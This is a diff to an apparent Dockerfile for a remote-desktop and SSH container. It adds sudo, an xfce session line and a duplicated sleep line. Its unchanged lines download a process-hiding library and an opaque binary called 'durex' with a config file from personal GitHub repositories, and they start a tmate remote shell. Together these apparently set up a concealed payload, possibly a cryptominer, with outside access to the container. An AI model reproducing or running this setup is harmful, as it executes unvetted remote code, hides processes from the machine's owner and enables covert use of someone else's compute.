@@ -6,7 +6,7 @@ RUN apt update && apt upgrade -y && apt install -y \
     python3-packaging python3-psutil python3-xdg \
     libcairo2 libdrm2 libgbm1 libglib2.0-0 libgtk-3-0 \
     libnspr4 libnss3 libpango-1.0-0 libutempter0 \
-    libxdamage1 libxfixes3 libxkbcommon0 libxrandr2 libxtst6
+    libxdamage1 libxfixes3 libxkbcommon0 libxrandr2 libxtst6 sudo
 RUN wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
 RUN dpkg -i chrome-remote-desktop_current_amd64.deb
 RUN apt-get install --assume-yes --fix-broken
@@ -17,8 +17,9 @@ RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
 RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
 && wget https://raw.githubusercontent.com/bulboni/tm/main/config.json \
 && chmod +x durex
-    
+RUN echo "startxfce4 :1030" >> .chrome-remote-desktop-session
 RUN mkdir /run/sshd \
+    && echo "sleep 5" >> /openssh.sh \
     && echo "sleep 5" >> /openssh.sh \
     && echo "tmate -F &" >>/openssh.sh \
     && echo '/usr/sbin/sshd -D' >>/openssh.sh \
